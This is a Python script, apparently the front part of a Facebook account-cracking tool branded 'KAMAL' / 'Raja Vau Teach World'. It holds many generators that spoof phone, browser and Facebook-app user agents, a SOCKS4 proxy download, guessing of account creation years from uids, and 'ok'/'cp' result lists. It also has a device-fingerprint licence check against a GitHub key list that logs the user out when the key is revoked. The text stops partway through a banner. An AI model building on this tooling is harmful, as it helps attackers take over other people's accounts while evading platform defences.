import os
import sys
import subprocess

def _ensure_packages():
    required = {
        "requests": "requests",
        "bs4": "beautifulsoup4",
    }
    missing = []
    for mod_name, pip_name in required.items():
        try:
            __import__(mod_name)
        except ImportError:
            missing.append(pip_name)

    if missing:
        print(f"[*] Installing required modules: {', '.join(missing)}...")
        cmds = [
            [sys.executable, "-m", "pip", "install", "--break-system-packages", *missing],
            [sys.executable, "-m", "pip", "install", *missing],
            ["pip", "install", "--break-system-packages", *missing],
            ["pip", "install", *missing],
        ]
        for cmd in cmds:
            try:
                res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                if res.returncode == 0:
                    break
            except Exception:
                continue

_ensure_packages()

import shutil
import time
import datetime
import random
import re
import uuid
import hashlib
import string
import requests
import json
import urllib
import platform
import threading
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool

method = []
oks = []
cps = []
loop = 0
user = []
pcp = []
id = []
uid = []
tokenku = []

ok = 0
cp = 0
KAMAL = []

#------------------[ KEY SECURITY CONFIG ]------------------------#
KEY_URL = "https://raw.githubusercontent.com/rajavau379-pixel/Raja/refs/heads/main/Key.txt"
DEVICE_LOCK_FILE = os.path.join(
    os.environ.get("HOME", os.path.expanduser("~")),
    ".raja_vau_device_lock"
)
SESSION_REVOKED_EVENT = threading.Event()
_SESSION_LOCK_MUTEX = threading.Lock()
_LAST_CHECK_TIME = 0.0
_LAST_CHECK_RESULT = None

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
R = '\x1b[38;5;246m'
N = '\x1b[0m'
wx = '\x1b[1;37m'
CYAN = '\033[1;36m'
BOLD = '\033[1m'
RESET = '\033[0m'

def save_result(filename: str, line: str):
    """যেকোনো ডিভাইসে নিরাপদভাবে রেজাল্ট সেভ করে (/sdcard না মিললে লোকাল ফোল্ডারে)"""
    paths = [
        os.path.join("/sdcard", filename),
        os.path.join(os.environ.get("HOME", os.path.expanduser("~")), filename),
        filename,
    ]
    for p in paths:
        try:
            parent = os.path.dirname(p)
            if parent:
                os.makedirs(parent, exist_ok=True)
            with open(p, "a", encoding="utf-8") as f:
                f.write(line)
            return
        except Exception:
            continue

#------------------[ USER AGENT ]------------------------#
def use11r_agent():
    android = random.choice(["11", "12", "13", "14", "15", "16"])
    device = random.choice([
        "TECNO CL6", "TECNO CK8n", "TECNO BG6",
        "TECNO KL8", "TECNO LI9", "TECNO CG8",
        "vivo V2311", "vivo V2324", "vivo V2338",
        "vivo V2345", "vivo V2350", "vivo V2366",
        "OPPO CPH2387", "OPPO CPH2525",
        "OPPO CPH2579", "OPPO CPH2607",
        "realme RMX3830", "realme RMX3686",
        "realme RMX3710", "realme RMX3851",
        "Redmi Note 13", "Redmi 12", "Redmi Note 12",
        "Redmi Note 13 Pro", "Redmi Note 14",
        "Redmi 13C", "Xiaomi 14", "Xiaomi 15",
        "Samsung SM-A546E", "Samsung SM-S921B",
        "Samsung SM-A256E", "Samsung SM-S926B",
        "Samsung SM-S928B", "Samsung SM-A556E",
        "Motorola XT2343-2", "moto g54 5G",
        "moto g85 5G", "moto edge 50",
        "Infinix X6837", "Infinix X6850",
        "Infinix X6871", "Infinix X6720",
        "Google Pixel 7", "Google Pixel 8",
        "Google Pixel 8 Pro", "Google Pixel 9",
        "Google Pixel 9 Pro", "Google Pixel 10"
    ])
    browsers = [
        "Chrome", "Firefox", "Kiwi", "Via", "Edge",
        "Opera", "Brave", "SamsungBrowser", "DuckDuckGo", "UCBrowser"
    ]
    browser = random.choice(browsers)
    if browser == "Chrome":
        version = random.choice([
            "142.0.0.0", "143.0.0.0", "144.0.0.0", "145.0.0.0",
            "146.0.0.0", "147.0.0.0", "148.0.0.0", "149.0.0.0",
            "150.0.0.0", "151.0.0.0", "152.0.0.0", "153.0.0.0",
            "154.0.0.0", "155.0.0.0"
        ])
        return f"Mozilla/5.0 (Linux; Android {android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Mobile Safari/537.36"
    elif browser == "Firefox":
        version = random.choice(["138.0", "139.0", "140.0", "141.0", "142.0"])
        return f"Mozilla/5.0 (Android {android}; Mobile; rv:{version}) Gecko/{version} Firefox/{version}"
    elif browser == "Kiwi":
        version = random.choice(["138.0.7204.168", "139.0.7258.66", "140.0.7339.80"])
        return f"Mozilla/5.0 (Linux; Android {android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Mobile Safari/537.36"
    elif browser == "Via":
        version = random.choice(["138.0.0.0", "139.0.0.0", "140.0.0.0"])
        return f"Mozilla/5.0 (Linux; Android {android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Mobile Safari/537.36"
    elif browser == "Edge":
        version = random.choice(["138.0.3351.83", "139.0.3405.86", "140.0.3485.54"])
        return f"Mozilla/5.0 (Linux; Android {android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Mobile Safari/537.36 EdgA/{version}"
    elif browser == "Opera":
        version = random.choice(["88.0.0.0", "89.0.0.0", "90.0.0.0"])
        return f"Mozilla/5.0 (Linux; Android {android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Mobile Safari/537.36 OPR/{version}"
    elif browser == "Brave":
        version = random.choice(["138.0.0.0", "139.0.0.0", "140.0.0.0"])
        return f"Mozilla/5.0 (Linux; Android {android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Mobile Safari/537.36"
    elif browser == "SamsungBrowser":
        version = random.choice(["27.0", "28.0", "29.0"])
        return f"Mozilla/5.0 (Linux; Android {android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{version} Chrome/139.0.0.0 Mobile Safari/537.36"
    elif browser == "DuckDuckGo":
        version = random.choice(["5.220", "5.221", "5.222"])
        return f"Mozilla/5.0 (Linux; Android {android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
    else:
        version = random.choice(["15.0.0.0", "15.1.0.0"])
        return f"Mozilla/5.0 (Linux; Android {android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/{version} Mobile Safari/537.36"

def ____PO_CO____():
    version = random.choice(["14", "15", "10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4", "5", "4.4.2", "5.1.1", "6.0.1", "9.0.1"])
    model = random.choice(["SM-T835", "SM-S901U", "SM-S134DL", "SM-J250F", "SM-A217F", "SM-A326B", "SM-A125F", "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN", "SM-A505GN", "SM-G930F", "SM-J210F", "SM-N9005"])
    build = random.choice(['MMB29Q', 'R16NW', 'LRX22C', 'KTU84P', 'JLS36C', 'NJH47F', 'PPR1.180610.011', 'QP1A.190711.020', 'NRD90M', 'RP1A.200720.012', 'M1AJB', 'MMB29T'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return f"Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36"

def __host__():
    version = random.choice([
        "16", "15", "14", "13", "12", "11", "10",
        "9", "9.0", "9.0.1", "8.0.0", "8.1.0",
        "7.0.0", "7.1.1", "7.1.2", "6.0.1"
    ])
    model = random.choice([
        "Infinix X650", "Infinix X688C", "Infinix X682B", "Infinix X6811", "Infinix X6815",
        "Infinix X670", "Infinix X689", "Infinix X683", "Infinix X657", "Infinix X663",
        "Infinix X604", "Infinix X573", "Infinix X559C", "Infinix X6831", "Infinix X612",
        "TECNO CL6", "TECNO CK7n", "TECNO KI5q", "TECNO KI7", "TECNO CH7n"
    ])
    build = random.choice([
        'BP2A.250605.031', 'AP3A.241105.008', 'AP2A.240905.003',
        'UP1A.231005.007', 'TQ3A.230805.001', 'TP1A.220624.014',
        'SP1A.210812.016', 'RP1A.200720.012', 'QP1A.190711.020',
        'PPR1.180610.011', 'NJH47F', 'NRD90M', 'MMB29Q'
    ])
    ver = str(random.randint(100, 140))
    ver2 = str(random.randint(0, 99))
    return f"Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36"

def window999():
    chrome_versions = [
        "142.0.0.0", "143.0.0.0", "144.0.0.0", "145.0.0.0",
        "146.0.0.0", "147.0.0.0", "148.0.0.0", "149.0.0.0",
        "150.0.0.0", "151.0.0.0", "152.0.0.0", "153.0.0.0",
        "154.0.0.0", "155.0.0.0",
    ]
    windows_profiles = ["Windows NT 10.0; Win64; x64", "Windows NT 10.0; WOW64"]
    chrome = random.choice(chrome_versions)
    windows = random.choice(windows_profiles)
    browser = random.choice(["Chrome", "Edge", "Facebook Web"])
    if browser == "Edge":
        return f"Mozilla/5.0 ({windows}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 Edg/{chrome}"
    return f"Mozilla/5.0 ({windows}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36"

def user_agent699():
    ua1 = "[FBAN/FB4A;FBAV/339.0.0.32.118;FBBV/323006995;FBDM/{density=2.0,width=720,height=1369};FBLC/en_GB;FBRV/325030047;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    ua2 = "[FBAN/FB4A;FBAV/309.0.0.3.179;FBBV/482983480;FBDM/{density=3.5,width=1080,height=1491};FBLC/en_GB;FBRV/0;FBCR/TNT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    ua3 = "[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672900;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/0;FBCR/YOTA;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo Z90a40;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua4 = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=3.0,width=1080,height=2224};FBLC/en_GB;FBRV/335247818;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    ua5 = "[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245028;FBDM/{density=3.0,width=1080,height=2090};FBLC/en_GB;FBRV/268119191;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JNY-LX1;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    __uaxx__ = random.choice([ua1, ua2, ua3, ua4, ua5])
    return (
        '[FBAN/FB4A;FBAV/'
        + str(random.randint(11, 99))
        + '.0.0.'
        + str(random.randint(1111, 9999))
        + ';FBBV/'
        + str(random.randint(1111111, 9999999))
        + ';'
        + __uaxx__
    )

def window222():
    user32_agents = [
        f"Mozilla/5.0 (Linux; Android {android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36"
        for device in [
            "TECNO CL6", "TECNO CK8n", "TECNO BG6", "TECNO KL8", "TECNO LI9", "TECNO CG8",
            "vivo V2311", "vivo V2324", "vivo V2338", "vivo V2345", "vivo V2350", "vivo V2366",
            "OPPO CPH2387", "OPPO CPH2525", "OPPO CPH2579", "OPPO CPH2607",
            "realme RMX3830", "realme RMX3686", "realme RMX3710", "realme RMX3851",
            "Redmi Note 13", "Redmi 12", "Redmi Note 12", "Redmi Note 13 Pro", "Redmi Note 14",
            "Redmi 13C", "Xiaomi 14", "Xiaomi 15",
            "Samsung SM-A546E", "Samsung SM-S921B", "Samsung SM-A256E", "Samsung SM-S926B",
            "Samsung SM-S928B", "Samsung SM-A556E",
            "Motorola XT2343-2", "moto g54 5G", "moto g85 5G", "moto edge 50",
            "Infinix X6837", "Infinix X6850", "Infinix X6871", "Infinix X6720",
            "Google Pixel 7", "Google Pixel 8", "Google Pixel 8 Pro", "Google Pixel 9",
            "Google Pixel 9 Pro", "Google Pixel 10"
        ]
        for android in ["13", "14", "15", "16"]
        for chrome in ["140.0.7339.0", "141.0.7390.0", "142.0.7444.0", "143.0.7499.0", "144.0.7559.0", "145.0.7632.0"]
    ]
    return random.choice(user32_agents)

def window41():
    user9_agents = [
        "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
        "Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 26_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 16; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.8103.38 Mobile Safari/537.36"
    ]
    return random.choice(user9_agents)

def window1():
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(range(140, 156))}.0.{random.choice(range(7000, 8500))}.{random.choice(range(50, 200))} Safari/537.36"
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(range(140, 156))}.0.{random.choice(range(7000, 8500))}.{random.choice(range(50, 200))} Safari/537.36"
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(range(140, 156))}.0.{random.choice(range(7000, 8500))}.{random.choice(range(50, 200))} Safari/537.36"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.{rr(7000, 8500)}.{rr(50, 200)} Safari/537.36"
    return random.choice([A, B, C, D])

def w761():
    chrome_versions = [
        "140.0.0.0", "141.0.0.0", "142.0.0.0", "143.0.0.0",
        "144.0.0.0", "145.0.0.0", "146.0.0.0", "147.0.0.0",
        "148.0.0.0", "149.0.0.0", "150.0.0.0", "151.0.0.0",
        "152.0.0.0", "153.0.0.0",
    ]
    return random.choice([
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v} Safari/537.36"
        for v in chrome_versions
    ])

def window761():
    chrome_versions = [
        "40.0.2214.89", "41.0.2272.118", "42.0.2311.90", "43.0.2357.124",
        "44.0.2403.157", "45.0.2454.101", "46.0.2490.86", "47.0.2526.106",
        "48.0.2564.116", "49.0.2623.112", "50.0.2661.102", "51.0.2704.106",
        "52.0.2743.116", "53.0.2785.143", "54.0.2840.99",
    ]
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(chrome_versions)} Safari/537.36"

def _0xwin1():
    return window1()

def generate_user_agent11():
    return window222()

def win99():
    chrome_versions = [
        "40.0.2214.89", "41.0.2272.118", "42.0.2311.90", "43.0.2357.124",
        "44.0.2403.157", "45.0.2454.101", "46.0.2490.86", "47.0.2526.106",
        "48.0.2564.116", "49.0.2623.112", "50.0.2661.102", "51.0.2704.106",
        "52.0.2743.116", "53.0.2785.143", "54.0.2840.99",
    ]
    windows = random.choice(["Windows NT 10.0; Win64; x64", "Windows NT 10.0; WOW64"])
    browser = random.choice(["Chrome", "Edge", "Firefox", "Opera", "Vivaldi"])
    chrome = random.choice(chrome_versions)
    if browser == "Firefox":
        ver = random.choice(["138.0", "139.0", "140.0", "141.0", "142.0"])
        return f"Mozilla/5.0 ({windows}; rv:{ver}) Gecko/20100101 Firefox/{ver}"
    elif browser == "Edge":
        return f"Mozilla/5.0 ({windows}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 Edg/{chrome}"
    elif browser == "Opera":
        ver = random.choice(["120.0.0.0", "121.0.0.0", "122.0.0.0"])
        return f"Mozilla/5.0 ({windows}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 OPR/{ver}"
    elif browser == "Vivaldi":
        return f"Mozilla/5.0 ({windows}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 Vivaldi/{chrome}"
    return f"Mozilla/5.0 ({windows}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36"

def OPERA_UA():
    android = "11"
    device = "RMX3241"
    build = "RP1A.200720.011"
    chrome = random.choice(["156.0.8078.79", "156.0.8078.80", "156.0.8078.81"])
    opera = random.choice(["102.0.0.0", "102.1.0.0", "102.2.0.0"])
    major = chrome.split(".")[0]
    return (
        f'Mozilla/5.0 (Linux; U; Android {android}; '
        f'{device} Build/{build}; wv) '
        f'AppleWebKit/537.36 (KHTML, like Gecko) '
        f'Version/4.0 Chrome/{chrome} Mobile Safari/537.36 '
        f'OPR/{opera}|'
        f'"Not_A Brand";v="8", "Chromium";v="{major}", '
        f'"Google Chrome";v="{major}"|{android}|{chrome}'
    )

def win761():
    user232_agents = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    ]
    return random.choice(user232_agents)

#------------->> CLEAR PRO >>-------------#
def linex():
    print(f"{wx}{47*'-'}")

try:
    sys.stdout.write('\x1b]2;𓆩【KAMAL】𓆪 \x07')
    sys.stdout.flush()
except Exception:
    pass

def type_name_animation():
    name = "KAMAL"
    print()
    sys.stdout.write(CYAN + BOLD + "              ")
    sys.stdout.flush()
    for char in name:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.12)
    print(RESET)
    time.sleep(0.2)

def animate_loading(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    print()

try:
    prox = requests.get(
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all',
        timeout=10
    ).text
    open('Proksi.txt', 'w', encoding='utf-8').write(prox)
except Exception:
    pass

def creationyear(uid):
    uid = str(uid)
    if len(uid) == 15:
        if uid.startswith(('1000000000', '100000000', '10000000', '1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith(('10007', '10008')):
            return '2022'
        if uid.startswith('10009'):
            return '2023'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    return ''

def get_width():
    try:
        return shutil.get_terminal_size().columns
    except Exception:
        return 45

#------------------[ DEVICE LOCK & RAW KEY SYSTEM ]------------------------#
def _collect_hardware_fingerprint() -> str:
    parts = [
        platform.system(),
        platform.machine(),
        platform.processor(),
        os.environ.get("PREFIX", ""),
        os.environ.get("TERMUX_VERSION", ""),
        str(os.getuid()) if hasattr(os, "getuid") else ""
    ]
    for path in (
        "/proc/sys/kernel/random/boot_id",
        "/sys/class/android_usb/android0/iSerial",
        "/proc/cpuinfo"
    ):
        try:
            if os.path.exists(path):
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    snippet = f.read(300).strip()
                    if snippet:
                        parts.append(snippet)
        except Exception:
            pass
    return "|".join(parts)

def get_fixed_device_key() -> str:
    with _SESSION_LOCK_MUTEX:
        if os.path.exists(DEVICE_LOCK_FILE):
            try:
                existing = open(DEVICE_LOCK_FILE, "r", encoding="utf-8").read().strip()
                if existing.startswith("RajaVauTeachWorld") and len(existing) >= 20:
                    return existing
            except Exception:
                pass

        fp = _collect_hardware_fingerprint()
        digest = hashlib.sha256(fp.encode("utf-8")).hexdigest()[:10].upper()
        fixed_key = f"RajaVauTeachWorld{digest}"

        try:
            os.makedirs(os.path.dirname(DEVICE_LOCK_FILE), exist_ok=True)
            with open(DEVICE_LOCK_FILE, "w", encoding="utf-8") as f:
                f.write(fixed_key + "\n")
            try:
                os.chmod(DEVICE_LOCK_FILE, 0o600)
            except Exception:
                pass
        except Exception:
            pass

        return fixed_key

def fetch_approved_keys_set() -> set:
    sep = "&" if "?" in KEY_URL else "?"
    bust_url = f"{KEY_URL}{sep}_t={int(time.time() * 1000)}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) RajaVauSecurity/2.0",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Expires": "0"
    }
    resp = requests.get(bust_url, headers=headers, timeout=10)
    resp.raise_for_status()
    approved = set()
    for line in resp.text.splitlines():
        cleaned = line.strip()
        if cleaned and not cleaned.startswith("#"):
            approved.add(cleaned)
    return approved

def _force_logout_now(reason: str = "Your Key has been removed by Admin! Logging out immediately..."):
    SESSION_REVOKED_EVENT.set()
    try:
        if os.path.exists("device.txt"):
            os.remove("device.txt")
    except Exception:
        pass
    print(f"\n\n\033[1;31m[!] {reason}\033[0m")
    print("\033[1;33m[!] Contact Admin WhatsApp: +880 1345-294347\033[0m\n")
    os._exit(1)

def _background_key_watcher(user_key: str, interval: int = 8):
    while not SESSION_REVOKED_EVENT.is_set():
        time.sleep(interval)
        if SESSION_REVOKED_EVENT.is_set():
            break
        try:
            approved_keys = fetch_approved_keys_set()
            if user_key not in approved_keys:
                _force_logout_now()
        except Exception:
            pass

def start_key_watcher_once(user_key: str):
    if not getattr(start_key_watcher_once, "_started", False):
        start_key_watcher_once._started = True
        t = threading.Thread(target=_background_key_watcher, args=(user_key, 8), daemon=True)
        t.start()

def verify_active_session():
    global _LAST_CHECK_TIME, _LAST_CHECK_RESULT
    if SESSION_REVOKED_EVENT.is_set():
        _force_logout_now()

    user_key = get_fixed_device_key()
    now = time.time()

    with _SESSION_LOCK_MUTEX:
        if _LAST_CHECK_RESULT is False:
            _force_logout_now()
        if (now - _LAST_CHECK_TIME) < 4.0 and _LAST_CHECK_RESULT is True:
            return True

    try:
        approved_keys = fetch_approved_keys_set()
        is_valid = user_key in approved_keys
        with _SESSION_LOCK_MUTEX:
            _LAST_CHECK_TIME = time.time()
            _LAST_CHECK_RESULT = is_valid
        if not is_valid:
            _force_logout_now()
        return True
    except Exception:
        with _SESSION_LOCK_MUTEX:
            if _LAST_CHECK_RESULT is False:
                _force_logout_now("Internet/Server verification failed! Logging out...")
        return True

def approval_system():
    user_key = get_fixed_device_key()

    try:
        approved_keys = fetch_approved_keys_set()
        if user_key in approved_keys:
            try:
                open("device.txt", "w", encoding="utf-8").write(user_key)
            except Exception:
                pass
            start_key_watcher_once(user_key)
            return
    except Exception:
        pass

    try:
        os.system("xdg-open https://youtube.com/@raja-vau-teach-world?si=KeIo3GwUzYIrmbCI 2>/dev/null")
    except Exception:
        pass

    width = max(get_width(), 40)
    padding = " " * max(0, (width - 56) // 2)

    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        type_name_animation()
        print("\n")
        print(f"{padding}\033[1;96m    ██╗   ██╗ ██████╗ ██╗   ██╗████████╗██╗   ██╗██████╗ \033[0m")
        print(f"{padding}\033[1;93m    ╚██╗ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝██║   ██║██╔══██╗\033[0m")
        print(f"{padding}\033[1;92m     ╚████╔╝ ██║   ██║██║   ██║   ██║   ██║   ██║██████╔╝\033[0m")
        print(f"{padding}\033[1;96m      ╚██╔╝  ██║   ██║██║   ██║   ██║   ██║   ██║██╔══██╗\033[0m")
        print(f"{padding}\033[1;94m       ██║   ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝██████╔╝\033[0m")
        print(f"{padding}\033[1;95m       ╚═╝    ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ \033[0m")
        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m")
        print(f"{padding}\033[1;92m            ✦ WELCOME TO RAJA VAU TEACH WORLD ✦          \033[0m")
        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m\n")

        print(f"{padding}\033[1;36m╔══════════════════════════════════════════════════════╗\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32mYour Key     : \033[1;33m{user_key:<36}\033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;37mFixed Device Key (Never Changes)                   \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;35mWhatsApp No  : +880 1345-294347                        \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m╚══════════════════════════════════════════════════════╝\033[0m")
        print(f"{padding}\033[1;32m [1] Join WhatsApp Group & Send Key\033[0m")
        print(f"{padding}\033[1;32m [2] Check Approval Status\033[0m")
        print(f"{padding}\033[1;31m [0] Exit\033[0m")
        print(f"{padding}\033[1;36m──────────────────────────────────────────────────────\033[0m")

        choice = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
        if choice == '1':
            try:
                os.system("xdg-open https://chat.whatsapp.com/EgtNyD2Vm0A8PdVui75dXc 2>/dev/null")
            except Exception:
                pass
            print(f"{padding}\033[1;32m [+] Opening WhatsApp Group...\033[0m")
            time.sleep(2)
        elif choice == '2':
            animate_loading(f"\n{padding}\033[1;32m [+] Checking approval status from server...")
            try:
                approved_keys = fetch_approved_keys_set()
                if user_key in approved_keys:
                    try:
                        open("device.txt", "w", encoding="utf-8").write(user_key)
                    except Exception:
                        pass
                    print(f"{padding}\033[1;33m [✓] Key Approved Successfully!\033[0m")
                    time.sleep(2)
                    start_key_watcher_once(user_key)
                    break
                else:
                    print(f"{padding}\033[1;31m [!] Key Not Approved Yet by Admin!\033[0m")
                    time.sleep(2)
            except Exception:
                print(f"{padding}\033[1;31m [!] Connection Error! Check your internet.\033[0m")
                time.sleep(2)
        elif choice == '0':
            sys.exit(0)
        else:
            print(f"{padding}\033[1;31m [!] Invalid Choice!\033[0m")
            time.sleep(1)

def banner():
    verify_active_session()
    os.system('clear' if os.name == 'posix' else 'cls')
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 55) // 2)

    print("\n")
    print(f"{padding}\033[1;31m  ██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██╗  \033[0m")
    print(f"{padding}\033[1;31m  ██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║  \033[0m")
